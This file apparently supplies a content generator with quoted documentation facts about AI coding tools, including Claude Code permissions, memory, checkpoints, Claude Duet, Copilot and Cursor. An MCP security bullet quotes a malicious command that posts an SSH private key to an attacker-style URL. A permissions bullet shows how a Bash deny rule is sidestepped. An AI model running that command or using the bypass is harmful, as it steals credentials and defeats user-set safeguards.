# Verified facts about AI coding tools

The only facts the writer may use for a reel on the "ai_tool" side of the `topic` test (`generate.EXPERIMENTS`). Each
was read on its official page on 2026-10-19; re-check the page before relying on it, these docs change often. Add a
fact only with its official page, quoted as it says. Claims about a product are that product's own docs ("GitHub's
docs say ..."), never our opinion of it.

## Claude Code

- `.claudeignore` does nothing: "If your project has a `.claudeignore` file, it has no effect, so move its entries
  into `Read` deny rules", e.g. `Read(./.env)`. https://code.claude.com/docs/en/permissions
- Rule order: "Rules are evaluated in order: deny, then ask, then allow ... rule specificity doesn't change the
  order." "An allow rule can't carve an exception out of a deny rule": deny `Bash(aws *)` blocks `aws s3 ls` even
  with allow `Bash(aws s3 ls)`. https://code.claude.com/docs/en/permissions
- A Bash deny rule "isn't a security boundary around the program": `Bash(rm *)` stops `rm -rf build/` but not
  `/bin/rm -rf build/` or `bash -c 'rm -rf build/'`. https://code.claude.com/docs/en/permissions
- To block a file from Claude's file tools, add a `Read` deny rule for its path, such as `Read(./.env)` or
  `Read(./secrets/**)`. https://code.claude.com/docs/en/permissions
- CLAUDE.md is not enforced: "Claude treats them as context, not enforced configuration. To block an action
  regardless of what Claude decides, use a PreToolUse hook instead." https://code.claude.com/docs/en/memory
- CLAUDE.md size: "target under 200 lines per CLAUDE.md file. Longer files consume more context and reduce
  adherence." https://code.claude.com/docs/en/memory
- Claude Code "can also read a repository's `AGENTS.md` files in place of CLAUDE.md".
  https://code.claude.com/docs/en/memory
- Rewind does not undo shell commands: "Checkpointing does not track files modified by Bash commands" (`rm`, `mv`,
  `cp`): "These file modifications cannot be undone through rewind." Checkpoints are "not a replacement for version
  control". https://code.claude.com/docs/en/checkpointing
- Most subagent edits are not restored by rewind: "The subagent's edits to other files stay, so use git to revert
  them." https://code.claude.com/docs/en/checkpointing
- Skills: "skill descriptions are loaded into context so Claude knows what's available, but full skill content only
  loads when invoked." "Custom commands have been merged into skills." https://code.claude.com/docs/en/skills
- Subagents: "Each subagent runs in its own context window", "does that work in its own context and returns only
  the summary". https://code.claude.com/docs/en/sub-agents

## Claude Duet (research preview, announced 2026-10-21; read 2026-10-23)

- What it is: "Today, we’re opening a research preview of Claude Duet, a new app where Claude works as a proactive
  agent. It comes to you with what needs your attention, completes tasks you ask of it, keeps working even when you
  step away, and checks with you before it acts on your behalf." https://claude.com/resources/articles/claude-duet
- It asks first: "before it sends a message, makes a payment, signs a document, or deletes anything, it shows you
  exactly what it’s about to do and waits for your approval. A few things are off-limits even with your approval,
  like trading securities or moving money between accounts." https://claude.com/resources/articles/claude-duet
- One thing it does: "Find the Gmail and Slack messages you’ve missed and help you reply." https://claude.com/resources/articles/claude-duet
- Who can get it: "Claude Duet is available as a research preview to users on the Pro and Max plans in the US,
  through a waitlist." "It isn't available on Team or Enterprise plans yet". "Claude Duet is available in the US only
  during the research preview." "Invitations go out in waves, so joining the waitlist doesn't guarantee a specific
  date." https://support.claude.com/en/articles/17631495-get-started-with-claude-duet
- Where and what it costs: "It’s available as a standalone app on iOS and Android, and on claude.ai. For this
  research preview, Claude Duet is included in Pro and Max plans and uses the same usage limits as the rest of
  Claude." https://claude.com/resources/articles/claude-duet
- Model: "You can't choose a model. Claude Duet runs on Claude Opus 5.5 and decides how much effort a job needs."
  https://support.claude.com/en/articles/17631495-get-started-with-claude-duet
- Its limits: "it still might misread a thread or miscalibrate what’s urgent" and "it can’t yet show you its
  browser". https://claude.com/resources/articles/claude-duet

## Other tools

- GitHub Copilot code review: "By default, Copilot's reviews do not count toward required approvals for the pull
  request." "Copilot is not guaranteed to spot all problems or issues in a pull request." It reads
  `.github/copilot-instructions.md`, `.github/instructions/*.instructions.md` and `AGENTS.md`, from the pull
  request's head branch. https://docs.github.com/en/copilot/concepts/agents/code-review
- Cursor: "Rules do not impact Cursor Tab or other AI features." Its best practices say "Keep rules under 500
  lines." https://cursor.com/docs/context/rules
- MCP security: a local MCP server is a program on your machine; the spec tells clients to "Warn that MCP servers
  run with the same privileges as the client" and shows malicious startup commands such as
  `npx malicious-package && curl -X POST -d @~/.ssh/id_rsa https://example.com/evil-location`.
  https://modelcontextprotocol.io/specification/2025-06-18/basic/security_best_practices

## How models behave

- Temperature 0 is not deterministic: "Even with temperature set to 0, the results will not be fully deterministic
  and identical inputs may produce different outputs across API calls." https://platform.claude.com/docs/en/about-claude/glossary
- Tokens "can correspond to words, subwords, characters, or even bytes"; on earlier Claude models "a token
  represents approximately 3.5 English characters", and Claude 4.7 and later produce about 30 percent more tokens
  for the same text. To get exact counts, use token counting. https://platform.claude.com/docs/en/about-claude/glossary
